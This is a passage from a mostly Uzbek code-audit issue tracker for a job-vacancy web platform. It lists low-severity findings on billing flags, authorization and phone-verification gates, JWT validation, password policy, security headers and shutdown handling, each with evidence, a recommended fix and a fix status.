- **Impact:** Hozir inert, chunki route'lar ro'yxatdan o'tmagan. Lekin README va DEPLOY BILLING_ENABLED=true'ni qo'llab-quvvatlanadigan kalit deb yozadi. Yoqilsa /api/plans 3 vakansiyali bepul limit va pullik qidiruvni e'lon qiladi, imzolangan Payme pre-check esa to'lovsiz rejani faollashtirishi mumkin.
- **Evidence:** billing.service.ts:17-27 `maxActiveVacancies: 3`, `canSearchCandidates: false`, '3 ta faol vakansiya'; :171-180 AppError(402, "PLAN_FEATURE_LOCKED"), chaqiruvchisi yo'q; billing.routes.ts:142 `await markPaymentPaid(transactionId)` metod/summa tekshiruvisiz, :159 `{ result: { state: 2 } }`.
- **Recommended fix:** Afzal variant: billing modulini o'chirib, sxemani arxitektura §14 bo'yicha saqlash. Qolsa: cheklovli reja matnlari, assertCanSearchCandidates va canPostMore'ni olib tashlang; provayder holat mashinasini metod, summa va timingSafeEqual bilan yozing; pending'larni qayta ishlating; README/.env.example'da bayroqni 'yoqmang' deb belgilang. admin.routes.ts:17 importini ham moslang.
- **Severity izohi:** P3: hozir inert. ISSUE-064 faqat bayroq bilan FIXED; birlashtirilgan R147 (webhook) va R239 (DEFAULT_PLANS) kodda hali bor.
- **Manba topilmalar:** monetization-6
- **Bajarilgan fix:** monetization-6: WONT FIX — D-065: billing moduli flag bilan o'chiq qoladi; qayta yoqish xavfsiz emasligi hujjatlashtirildi
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### R3 ISSUE-065

**Hujjatlar monetizatsiyani hali faol deb ko'rsatadi: tizim-arxitekturasi.md, CHANGELOG va audit xaritalari (snapshot belgisisiz)**

- **Severity:** P3
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** FIXED
- **Mavjud tracker:** ISSUE-065
- **Area:** docs/monetization
- **Fayl:** `tizim-arxitekturasi.md:638`
- **Root cause:** D-014 va ISSUE-065 fix'i faqat README, DEPLOY va .env.example'ni yangilagan. Arxitektura hujjatining joriy holat jadvali, CHANGELOG va PHASE 1 audit xaritalari yangilanmagan va eskirgan snapshot deb belgilanmagan.
- **Impact:** O'quvchi tarif limitlari, admin to'lov tasdig'i va to'lov provayderi shartnomasini deploy'dan oldingi amaldagi talab deb o'ylaydi, nomzod qidiruvi pullik yoki billing ochiq deb hisoblaydi va bajarilgan fix'larni qayta qiladi. e2e esa limitsizlik va /api/plans 404 ni tekshiradi.
- **Evidence:** tizim-arxitekturasi.md:638 `| 14. Monetizatsiya | ✅ | Tariflar, limitlar, Payme/Click havolasi, admin tasdig'i |`, :651 provayder shartnomasi, :161 '(tarif chegarasida)'; CHANGELOG.md:80 'sitemap, OG rasm, tarif limiti)', :327, :360, BILLING_ENABLED/bepul yozuvi yo'q; docs/audit/maps/API_MAP.md:116 '402 PLAN_FEATURE_LOCKED'; ROUTE_MAP.md:117 /pricing.
- **Recommended fix:** tizim-arxitekturasi.md 14-qatorini 'O'chiq — BILLING_ENABLED=false (D-014); platforma bepul, limit yo'q' qiling, provayder savolini olib tashlang, :161/:197-198/:494 ni tarixiy deb belgilang. CHANGELOG'ga yangi versiya yozuvi (402 olib tashlandi, limitsiz, billing bayroq ortida, /pricing -> /employer). Har audit xaritasi boshiga 'PHASE 1 snapshot — joriy holat: ISSUES.md va FINAL_AUDIT.md' izohini qo'shing.
- **Severity izohi:** P3 saqlandi: faqat hujjat. Uch hujjat bitta 'D-014 dan keyin yangilanmagan' ildiziga birlashtirildi; ISSUE-065 va ISSUE-145 fix'i to'liq emas.
- **Manba topilmalar:** monetization-7, monetization-8, monetization-9
- **Bajarilgan fix:** monetization-7: FIXED — tizim-arxitekturasi.md 19-bo'lim: monetizatsiya O'CHIQ deb yangilandi | monetization-8: FIXED — CHANGELOG.md 0.4.0 yozuvi qo'shildi (Round 3) | monetization-9: FIXED — docs/audit/maps/* ga PHASE 1 snapshot banneri qo'shildi
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### R3 ISSUE-046

**Vakansiya sahifasi bitta arizani topish uchun nomzodning barcha arizalarini yuklaydi; GET /api/applications chegarasiz**

- **Severity:** P3
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** PARTIAL
- **Mavjud tracker:** ISSUE-046
- **Area:** performance/scale
- **Fayl:** `apps/api/src/modules/applications/applications.routes.ts:129`
- **Root cause:** Vakansiya bo'yicha 'mening arizam' endpointi yo'q, nomzod ro'yxati so'rovida esa take ham, cursor ham yo'q.
- **Impact:** Yuzlab arizasi bor faol nomzod har vakansiya sahifasini ochganda holat tarixi bilan to'liq ro'yxatni yuklaydi, javob hajmi va DB ishi faollik bilan o'sadi.
- **Evidence:** applications.routes.ts:129-155 `prisma.application.findMany({ where: { jobSeekerId } ... })` take'siz, statusHistory, vacancy, company include; useApplication.ts har mount'da `fetchMyApplications(accessToken)` va `apps.value.find((a) => a.vacancy.id === vacancyId)`; ISSUE-046 root cause'ida /api/applications chegarasiz deb yozilgan.
- **Recommended fix:** [vacancyId, jobSeekerId] unikal indeksiga tayanadigan GET /api/vacancies/:id/my-application qo'shing. /api/applications'ga take va cursor bering.
- **Severity izohi:** P3 saqlandi. ISSUE-046 PARTIAL: /api/applications qismi tuzatilmagan.
- **Manba topilmalar:** candidate-flows-15
- **Bajarilgan fix:** candidate-flows-15: PARTIAL — GET /api/applications endi chegaralangan (300). Tavsiya qilingan GET /api/vacancies/:id/my-application qo'shilmadi: uni chaqiradigan web fayli (lib/useApplication.ts) mening doiram
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### R3 ISSUE-036

**Ariza holati o'zgarishlari cheklanmagan; izoh xabari telefon tasdig'i gate'ini chetlab o'tadi**

- **Severity:** P3
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** PARTIAL
- **Mavjud tracker:** ISSUE-036
- **Area:** employer/applications
- **Fayl:** `apps/api/src/modules/applications/applications.routes.ts:333`
- **Root cause:** PATCH /api/applications/:id/status istalgan holatdan viewed/invited/rejected/accepted'ni qabul qiladi, faqat bir xil takror o'tkazib yuboriladi. Izoh getOrCreateConversation + deliverMessage orqali chatga yuboriladi, /api/conversations/start'dagi requirePhoneVerified esa bu yerda yo'q.
- **Impact:** Nomzod 'Qabul qilindingiz'dan keyin 'Ko'rildi' yoki takroriy rad/qabul almashinuvlarini, har biri bildirishnoma va email bilan oladi. Telefoni tasdiqlanmagan ish beruvchi izoh maydoni orqali istalgan arizachi bilan chat ocha oladi.
- **Evidence:** applications.routes.ts:20-23 status enum; :311 preHandler `[requireAuth, requireRole("employer", "admin")]` phone gate'siz; :333-335 `changed = application.status !== status; if (!changed && !reasonText) return current;`; :352-356 getOrCreateConversation + deliverMessage; chat.routes.ts:294 start `requirePhoneVerified`.
- **Recommended fix:** Ruxsat etilgan o'tishlarni belgilang ('viewed'ga qaytish yo'q, yakuniy holatni o'zgartirishdan oldin tasdiq). Izoh yuborilganda requirePhoneVerified qo'llang.
- **Severity izohi:** P3 saqlandi. ISSUE-036 root cause 'holat mashinasi yo'q' edi, fix faqat bir xil holat takrorini to'xtatgan.
- **Manba topilmalar:** employer-flows-13
- **Bajarilgan fix:** employer-flows-13: PARTIAL — Izoh (reason) yuborilganda endi requirePhoneVerified qo'llanadi — chat bilan bir xil gate, chunki izoh nomzodga suhbat xabari bo'lib boradi. Holatlar orasidagi o'tishlar cheklanmad
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### R3 ISSUE-059

**Admin tasdiqlashi placement qoidalarini tekshirmaydi, shaxsiy draft'ni chop eta oladi va ish beruvchini xabardor qilmaydi**

- **Severity:** P3
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** PARTIAL
- **Mavjud tracker:** ISSUE-059
- **Area:** admin/moderation
- **Fayl:** `apps/api/src/modules/admin/admin.routes.ts:301`
- **Root cause:** /api/admin/vacancies/:id/moderate istalgan holatdan, jumladan ish beruvchi draft'idan, assertVacancyPlacement chaqirmasdan 'active' qo'yadi va egasini faqat rad etishda xabardor qiladi.
- **Impact:** Admin kategoriyasi yoki workplaceType'i yo'q eski vakansiyalarni yoki tugatilmagan draft'larni chop etishi mumkin. Qayta yuborgan vakansiyasi tasdiqlangan ish beruvchi e'lon faol bo'lganini bilmaydi.
- **Evidence:** admin.routes.ts:289 `status: z.enum(["active", "rejected", "archived"])`; :301-309 placement tekshiruvisiz update; :314-322 notify faqat `status === "rejected"` da; admin/vacancies/+Page.tsx:175-178 Activate barcha faol bo'lmagan qatorlarda, draft'da ham.
- **Recommended fix:** Admin faollashtirishida assertVacancyPlacement'ni ishga tushiring, draft -> active'ni bloklang yoki tasdiq so'rang, tasdiqlash va arxivlashda egasiga sabab bilan xabar yuboring.
- **Severity izohi:** P3 saqlandi. ISSUE-059 fix'i faqat employer PATCH /status yo'lini qamragan, admin moderate yo'li qolgan.
- **Manba topilmalar:** employer-flows-14
- **Bajarilgan fix:** employer-flows-14: PARTIAL — Admin activation validates placement rules and cannot publish drafts; admin archive now notifies the employer (vacancy.archivedByAdmin) in addition to the existing rejection notice
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### R3 ISSUE-024

**Arizasi bor rad etilgan yoki moderatsiyadagi vakansiyani ish beruvchi yopa ham, o'chira ham olmaydi; o'chirish tekshiruvi atomar emas**

- **Severity:** P3
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** PARTIAL
- **Mavjud tracker:** ISSUE-024
- **Area:** employer/vacancy-lifecycle
- **Fayl:** `apps/api/src/modules/vacancies/vacancies.routes.ts:272`
- **Root cause:** Egasi faqat 'active'dan arxivlay oladi, arizasi bor e'lonni DELETE rad etadi. Shuning uchun faol paytda ariza yig'ib, keyin rad etilgan yoki qayta moderatsiyaga yuborilgan vakansiyadan chiqish yo'li yo'q. DELETE arizalarni sanab, keyin tranzaksiyasiz o'chiradi.
- **Impact:** Vakansiya admin aralashguncha dashboard'da qotib qoladi. Kamdan-kam poygada count va delete orasida yaratilgan ariza cascade bilan o'chib ketadi.
- **Evidence:** vacancies.routes.ts:240 `archived: ["active"]`; :276-285 `prisma.application.count(...)` keyin :286 `prisma.vacancy.delete` tranzaksiyasiz; web lib/employer/vacancies/adapter.ts:97-104 close faqat active uchun.
- **Recommended fix:** Egasiga rejected va moderation vakansiyalarni archived'ga o'tkazishga ruxsat bering. O'chirishni shartli qiling: tranzaksiya ichida yoki 'deleting' belgisidan keyin qayta tekshirib.
- **Severity izohi:** P3 saqlandi. ISSUE-024 'rad etilgan e'londan chiqish yo'li' fix'i (tahrir -> moderation) yopish yo'lini qamramagan; ISSUE-025 qoidasi bilan bog'liq.
- **Manba topilmalar:** employer-flows-15
- **Bajarilgan fix:** employer-flows-15: PARTIAL — Owners can now close a rejected or moderation vacancy (archived allowed from active/rejected/moderation), so it no longer gets stuck. The count-then-delete race is NOT closed: Mong
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### R3 ISSUE-087

**PUT /api/vacancies/:id'da telefon tasdig'i gate'i yo'q, POST va qayta faollashtirishda esa bor**

- **Severity:** P3
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** FIXED
- **Mavjud tracker:** ISSUE-087
- **Area:** authz/phone-gate
- **Fayl:** `apps/api/src/modules/vacancies/vacancies.routes.ts:170`
- **Root cause:** PUT preHandler faqat requireAuth + requireRole. POST va PATCH -> active requirePhoneVerified chaqiradi.
- **Impact:** Telefoni tasdiqlanmagan, yoki kelgusidagi telefon almashtirish oqimida (G qoidasi) tasdig'i olingan hisob faol vakansiya mazmunini qayta yoza oladi.
- **Evidence:** vacancies.routes.ts:155 POST `requirePhoneVerified`; :168-170 PUT `{ preHandler: [requireAuth, requireRole("employer", "admin")] }`; :248 PATCH `if (!isAdmin) await requirePhoneVerified(req, reply)`; VacancyForm.tsx:224 PHONE_NOT_VERIFIED'ni allaqachon ishlaydi.
- **Recommended fix:** PUT'ga requirePhoneVerified qo'shing, kamida vakansiya faol bo'lganda.
- **Severity izohi:** P3 saqlandi. ISSUE-087 PARTIAL: PATCH tuzatilgan, PUT yo'q.
- **Manba topilmalar:** employer-flows-16
- **Bajarilgan fix:** employer-flows-16: FIXED — PUT /api/vacancies/:id runs requirePhoneVerified for non-admins, after the ownership check so foreign edits still answer 403; it also rejects employmentType remote with a non-remot
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### R3 ISSUE-089

**Masofaviy vakansiya joylashuvni saqlay olmaydi; API employmentType 'remote'ni istalgan workplaceType bilan qabul qiladi**

- **Severity:** P3
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** FIXED
- **Mavjud tracker:** ISSUE-089
- **Area:** product/workplace-rules
- **Fayl:** `apps/web/src/lib/employer/vacancies/form.ts:209`
- **Root cause:** toVacancyPayload masofaviy vakansiyada regionId'ni tahrirda null, yaratishda undefined yuboradi va forma hudud maydonini yashiradi. API createSchema office/hybrid bilan birga employmentType 'remote'ni ham qabul qiladi.
- **Impact:** Qoida bo'yicha remote uchun joylashuv ixtiyoriy, lekin web uni kiritib bo'lmaydigan qiladi va har tahrirda saqlangan hududni o'chiradi. API mijozlari office + remote kabi zid qatorlar saqlaydi va remote filtri ularni masofaviy deb sanaydi.
- **Evidence:** form.ts:209 `regionId: isRegionRequired(v.workplaceType) ? v.regionId : edit ? null : undefined`; vacancies.routes.ts:63 employmentType enum'da remote; vacancies.service.ts:128-131 employmentWhere employmentType va workplaceType'ni OR qiladi.
- **Recommended fix:** Remote uchun ixtiyoriy hudud maydonini ko'rsating va o'zgarmagan bo'lsa regionId'ni yubormang. Yangi yoki yangilangan qatorlarda workplaceType remote bo'lmasa employmentType 'remote'ni rad eting.
- **Severity izohi:** P3 saqlandi (ISSUE-089 NOT FIXED).
- **Manba topilmalar:** employer-flows-17
- **Bajarilgan fix:** employer-flows-17: FIXED — Web: the region field is shown for remote vacancies as optional and the payload keeps the chosen region instead of sending null. API: POST and PUT reject employmentType remote unle
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### R3 ISSUE-002

**Kompaniya formasi API rad etadigan SVG logoni taklif qiladi; PUT faqat bo'shliqdan iborat kompaniya nomini qabul qiladi**

- **Severity:** P3
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** PARTIAL
- **Mavjud tracker:** ISSUE-002
- **Area:** company/validation
- **Fayl:** `apps/web/src/components/EmployerCompanyForm.tsx:154`
- **Root cause:** Fayl input'ining accept ro'yxatida image/svg+xml qolgan, API esa faqat PNG, JPG va WebP qabul qiladi. PUT sxemasida name trim'siz z.string().min(1), POST'da esa trim().min(2).
- **Impact:** Foydalanuvchi SVG tanlab, yuklagandan keyin server xatosini oladi. API mijozlari vakansiya kartalarida bo'sh ko'rinadigan kompaniya nomini saqlay oladi.
- **Evidence:** EmployerCompanyForm.tsx:154 `accept="image/png,image/jpeg,image/webp,image/svg+xml"`; companies.routes.ts:158 saveUpload png/jpg/webp; :40 `name: z.string().min(1).max(160)` vs :31 `z.string().trim().min(2).max(160)`.
- **Recommended fix:** accept'dan image/svg+xml'ni olib tashlang va PUT name uchun trim().min(2) ishlating.
- **Severity izohi:** P3 saqlandi. ISSUE-002/D-013 SVG'ni API'da taqiqlagan, web accept ro'yxati yangilanmagan; nom validatsiyasi qo'shimcha kichik band.
- **Manba topilmalar:** employer-flows-19
- **Bajarilgan fix:** employer-flows-19: PARTIAL — Web half done: image/svg+xml removed from the logo file input accept list, so users can no longer pick a format the API rejects. The API half (PUT company name z.string().min(1) wi
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### R3 ISSUE-095

**/employer/@slug har qanday noma'lum segmentni doimiy 301 bilan /companies/<segment> ga yo'naltiradi**

- **Severity:** P3
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** NOT FIXED
- **Mavjud tracker:** ISSUE-095
- **Area:** routing
- **Fayl:** `apps/web/src/pages/employer/@slug/+guard.ts:15`
- **Root cause:** Guard statik employer sahifasi bo'lmagan har qanday /employer/<x> uchun shartsiz redirect(301) tashlaydi.
- **Impact:** Xato yozilgan manzillar va kelajakdagi employer bo'limlari (masalan /employer/company) 404 kompaniya sahifasiga keshlanadigan 301 oladi.
- **Evidence:** employer/@slug/+guard.ts:12-16 `throw redirect(localizeHref(`/companies/${slug}${search}`, pageLocale(pageContext).locale), 301)` slug mavjudligini tekshirmasdan.
- **Recommended fix:** Band qilingan employer segmentlari uchun 404 qaytaring yoki 302 ishlatib, slug mavjudligini tekshiring.
- **Severity izohi:** P3 saqlandi (ISSUE-095 NOT FIXED).
- **Manba topilmalar:** employer-flows-21
- **Bajarilgan fix:** employer-flows-21: NOT FIXED — P3: /employer/@slug catch-all 301 o'zgartirilmadi (mavjud SEO havolalarini buzmaslik uchun)
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### R3 ISSUE-009

**JWT tekshiruvi hali ham typ yoki v bo'lmagan tokenlarni qabul qiladi (legacy fallback)**

- **Severity:** P3
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** PARTIAL
- **Mavjud tracker:** ISSUE-009
- **Area:** auth/jwt
- **Fayl:** `apps/api/src/common/jwt.ts:54`
- **Root cause:** decode() typ yo'q bo'lsa o'tkazib yuboradi, verifyAccessToken v yo'q bo'lsa uni tashlab ketadi, requireAuth va WebSocket esa v undefined bo'lsa versiyani solishtirmaydi. Fix'dan oldin berilgan barcha tokenlar allaqachon muddati o'tgan (30 kundan ko'p).
- **Impact:** Bu o'lik moslik kodi. Kelajakdagi biror imzolash yo'li typ yoki v ni unutsa, uning tokenlari logout va blokdan omon qoladi. Dev'da sirlar bir xil bo'lsa, access va refresh o'rnida almashib ishlatilishi mumkin.
- **Evidence:** jwt.ts:12 izoh, :53-54 `if (typ !== undefined && typ !== expected)`, :61-62; auth-guard.ts:55-56; chat.routes.ts:203-214.
- **Recommended fix:** decode() da typ === expected va raqamli v ni majburiy qiling. auth-guard va WS handler'dagi ixtiyoriy v tarmoqlarini olib tashlang.
- **Severity izohi:** P3 saqlandi: D-008 legacy tokenlarni ataylab qabul qilgan, endi bu kerak emas.
- **Manba topilmalar:** auth-core-12
- **Bajarilgan fix:** auth-core-12: PARTIAL — requireAuth now rejects access tokens without `v` (any such token expired long ago). jwt.ts still accepts a missing `typ`, and the WebSocket handler still skips the version check w
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### R3 ISSUE-044

**Parol siyosati faqat uzunlikni tekshiradi: keng tarqalgan parollar, 8 belgili admin paroli ruxsat, signup maydonida minLength yo'q**

- **Severity:** P3
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** PARTIAL
- **Mavjud tracker:** ISSUE-044
- **Area:** auth/password-policy
- **Fayl:** `apps/api/src/modules/auth/auth.routes.ts:18`
- **Root cause:** registerSchema z.string().min(8).max(128); invite accept ham shunday; ADMIN_PASSWORD 8 belgida qabul qilinadi. Signup PasswordField'da minLength yo'q, qisqa parol xom inglizcha zod xatosini beradi.
- **Impact:** '12345678' kabi parollar qabul qilinadi. Chetlab o'tiladigan IP limiti va email uchun 15 daqiqada 10 urinish bilan ko'p hisoblarga keng tarqalgan parollarni purkash amalga oshiriladi.
- **Evidence:** auth.routes.ts:18; team.routes.ts:233; ensure-admin.ts:32-38.
- **Recommended fix:** Eng keng tarqalgan parollarning kichik ichki ro'yxatini va email local-part'iga teng parolni rad eting. Staff va admin uchun kamida 12 belgi. Client'da lokalizatsiya qilingan minLength tekshiruvi.
- **Severity izohi:** P3 saqlandi. ISSUE-044 (R206 manbasi: kuchlilik tekshiruvi yo'q) FIXED faqat max uzunlik uchun; ISSUE-096 (ADMIN_PASSWORD) va ISSUE-073 (xom zod xabari) bilan bog'liq.
- **Manba topilmalar:** auth-core-15
- **Bajarilgan fix:** auth-core-15: PARTIAL — Register and password reset reject a small common-password list and passwords equal to the email/local part (400 WEAK_PASSWORD). The 12-char staff rule (team.routes.ts invite accep
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### R3 ISSUE-044

**Login sahifasidagi 'Eslab qolish' checkbox hech narsa qilmaydi**

- **Severity:** P3
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** FIXED
- **Mavjud tracker:** ISSUE-044
- **Area:** ux/auth
- **Fayl:** `apps/web/src/pages/login/+Page.tsx:22`
- **Root cause:** remember holati hech qayerga yuborilmaydi yoki ishlatilmaydi. API har doim 30 kunlik refresh cookie o'rnatadi.
- **Impact:** Umumiy kompyuterda belgini olib tashlagan foydalanuvchi baribir 30 kunlik sessiya oladi. Xavfsizlikka taalluqli sozlama chalg'itadi.
- **Evidence:** login/+Page.tsx:22 `useState(true)`, :73-81 faqat UI; auth.routes.ts:48-50 maxAge 30 kun.
- **Recommended fix:** Checkbox'ni olib tashlang yoki /login ga remember:false yuborib, refresh cookie'ni maxAge'siz (brauzer sessiyasi) yoki qisqaroq muddat bilan o'rnating.
- **Severity izohi:** P3 saqlandi. ISSUE-044 R206 manbasida 'Eslab qolish dekorativ' deb qayd etilgan, tuzatilmagan.
- **Manba topilmalar:** auth-core-16
- **Bajarilgan fix:** auth-core-16: FIXED — The 'Remember me' checkbox was removed from /login (it never reached the API, which always sets a 30-day refresh cookie). The login.remember key was removed from types.ts and all t
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### R3 ISSUE-066

**Signup va login'dagi signup havolasi returnTo manzilini yo'qotadi**

- **Severity:** P3
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** FIXED
- **Mavjud tracker:** ISSUE-066
- **Area:** frontend/routing
- **Fayl:** `apps/web/src/pages/signup/+Page.tsx:34`
- **Root cause:** Signup'dan keyin done() har doim /employer yoki /profile ga olib boradi. Login sahifasi oddiy l('/signup') ga havola beradi, ?returnTo yo'qoladi. safeReturnTo o'zi to'g'ri.
- **Impact:** Himoyalangan sahifaga (masalan vakansiyaga ariza) urilgan mehmon ro'yxatdan o'tishni tanlasa, sahifaga qaytmay profilga tushadi. Asosiy ariza voronkasida ortiqcha qadam.
- **Evidence:** signup/+Page.tsx:34 `done = () => window.location.assign(l(role === "employer" ? "/employer" : "/profile"))`; login/+Page.tsx:101-102 href l('/signup').
- **Recommended fix:** Signup havolasida returnTo ni uzating va signup done() hamda SocialLogin onDone'da returnTargetOr(fallback) ishlating.
- **Severity izohi:** P3 saqlandi. ISSUE-066 PARTIAL: login tuzatilgan, signup yo'li qolgan.
- **Manba topilmalar:** auth-core-17
- **Bajarilgan fix:** auth-core-17: FIXED — The login page's link to /signup now carries ?returnTo (read from the URL on both SSR and client, so no hydration mismatch) and signup's done() - used by both the form and Google s
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### R3 ISSUE-100

**Deploy target'lari orasida web header nomuvofiqligi: Permissions-Policy yo'q, self-hosted'da HSTS yo'q, xavfli HSTS preload, 4 nusxa header ro'yxati**

- **Severity:** P3
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** PARTIAL
- **Mavjud tracker:** ISSUE-100
- **Area:** headers/parity
- **Fayl:** `apps/web/server/index.mjs:40`
- **Root cause:** Xavfsizlik header'lari vite.config.ts, api/ssr.js, server/index.mjs va vercel.json'da qo'lda nusxalangan. Hech biri Permissions-Policy bermaydi. HSTS faqat vercel.json'da, includeSubDomains va preload bilan. api/seo.js API'ni timeout'siz chaqiradi.
- **Impact:** Self-hosted deploy HSTS olmaydi. Custom apex'da preload+includeSubDomains barcha subdomenlarni HTTPS'ga majburlaydi va qaytarish qiyin. Kamera, mikrofon, geolokatsiya cheklanmagan. To'rt nusxa bir-biridan ajraladi. API osilib qolsa robots.txt va sitemap funksiya timeout'igacha kutadi.
- **Evidence:** server/index.mjs:40-45 va api/ssr.js:15-20 (HSTS va Permissions-Policy yo'q); vercel.json:28-31 `max-age=31536000; includeSubDomains; preload`; seo.js:39-41 signal'siz fetch.
- **Recommended fix:** Barcha target'larda bitta umumiy header moduli (CSP ham shu yerda). Permissions-Policy (camera=(), microphone=(), geolocation=()) va self-hosted'da HSTS qo'shing. Domen yakuniy bo'lguncha preload'ni olib tashlang. seo.js ga AbortSignal.timeout qo'shing.
- **Severity izohi:** P3 saqlandi; ISSUE-100 NOT FIXED.
- **Manba topilmalar:** headers-infra-14
- **Bajarilgan fix:** headers-infra-14: PARTIAL — Verified fixed: Permissions-Policy (camera/microphone/geolocation/payment) in all four sources, HSTS on the self-hosted server for https requests, 'preload' removed from vercel.jso
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### R3 ISSUE-079

**Shutdown Telegram update'larini tasdiqlamaydi va jarayondagi ishni kutmaydi; self-hosted web shutdown'da timeout yo'q**

- **Severity:** P3
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** PARTIAL
- **Mavjud tracker:** ISSUE-079
- **Area:** lifecycle/shutdown
- **Fayl:** `apps/api/src/modules/telegram/telegram.service.ts:439`
- **Root cause:** getUpdates offset'i xotirada 0 dan boshlanadi va Telegram update'ni faqat keyingi getUpdates chaqiruvida tasdiqlangan deb biladi. stopTelegramBot faqat bayroq qo'yadi, oxirgi qayta ishlangan paket tasdiqlanmaydi. API shutdown jarayondagi alert sweep'ni kutmasdan prisma.$disconnect qiladi. server/index.mjs da majburiy chiqish taymeri va ikkinchi signal himoyasi yo'q.
- **Impact:** Har deploy yoki restart'dan keyin Telegram oxirgi paketni qayta yuboradi: support xabarlari ikki marta relay qilinadi, /start foydalanuvchilari 'Havola eskirgan' oladi, kontaktlar qayta ishlanadi. Shutdown paytidagi alert sweep Prisma uzilgach yarim yo'lda yiqiladi. Osilgan web server platformaning SIGKILL'iga tayanadi.
- **Evidence:** telegram.service.ts:439 `let offset = 0`; :442-459; :465-467 stopTelegramBot; apps/api/src/server.ts:303-311; apps/web/server/index.mjs:134-140 timeout'siz app.close.
- **Recommended fix:** To'xtashda offset = oxirgi update_id + 1 va timeout 0 bilan bir marta getUpdates chaqiring (yoki offset'ni saqlang). Uzishdan oldin ishlayotgan sweep'ni vaqt chegarasi bilan kuting. server/index.mjs ga ham 10 soniyalik majburiy chiqish taymerini qo'shing.
- **Severity izohi:** P3 saqlandi, ishonch o'rtacha. ISSUE-079 FIXED faqat API bot sikli va timeout uchun; web server timeout va update ack qolgan.
- **Manba topilmalar:** headers-infra-15
- **Bajarilgan fix:** headers-infra-15: PARTIAL — stopTelegramBot() now acknowledges the last processed batch (getUpdates with offset, timeout 0) so restarts do not replay updates. Waiting for the in-flight alert sweep and the sel
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### R3 ISSUE-080

**Eski to'lovlar admin paneli billing bayrog'i ortida emas**

- **Severity:** P3
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** FIXED
- **Mavjud tracker:** ISSUE-080
- **Area:** admin-staff/monetization
- **Fayl:** `apps/api/src/modules/admin/admin.routes.ts:502`
- **Root cause:** server.ts faqat billingRoutes'ni features.billing bilan cheklaydi. adminRoutes har doim GET /api/admin/payments va POST /api/admin/payments/:transactionId/confirm'ni ro'yxatdan o'tkazadi, confirm esa markPaymentPaid orqali tarifni faollashtiradi. Web nav har doim To'lovlar'ni, overview esa Daromad kartasini ko'rsatadi.
- **Impact:** To'liq bepul platformaning asosiy admin tajribasida monetizatsiya UI'si qoladi va billing o'chiq bo'lsa ham admin pullik tarifni faollashtira oladi.
- **Evidence:** server.ts:253-254 `if (features.billing) await app.register(billingRoutes); await app.register(adminRoutes);`; admin.routes.ts:461-521; AdminShell.tsx:50 payments nav.
- **Recommended fix:** To'lov route'lari, nav tab va daromad kartasini features.billing bilan cheklang (bayroqni overview javobida bering).
- **Severity izohi:** P3 saqlandi: faqat admin yuzasi, D-014 buni qabul qilingan xavf sifatida qayd etgan. ISSUE-080 PARTIAL.
- **Manba topilmalar:** admin-staff-14
- **Bajarilgan fix:** admin-staff-14: FIXED — Same flag gate; the read-only legacy payments list stays reachable by URL, as D-065 allows, but is no longer advertised in the nav when billing is off.
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### R3 ISSUE-063

**E2E admin.routes mutatsiyalari uchun salbiy authz tekshiruvlarini qamramaydi**

- **Severity:** P3
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** FIXED
- **Mavjud tracker:** ISSUE-063
- **Area:** admin-staff/tests
- **Fayl:** `apps/api/scripts/e2e-check.mjs:930`
